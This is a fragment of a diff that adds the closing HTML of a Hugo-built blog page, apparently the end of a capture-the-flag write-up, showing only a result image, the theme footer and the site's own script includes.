+</span></span></code></pre></div><p><img src="/spellbook_getflag.png" alt="getflag"></p>
+
+      </div></div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://alagroy-42.github.io/assets/main.js"></script>
+<script src="https://alagroy-42.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
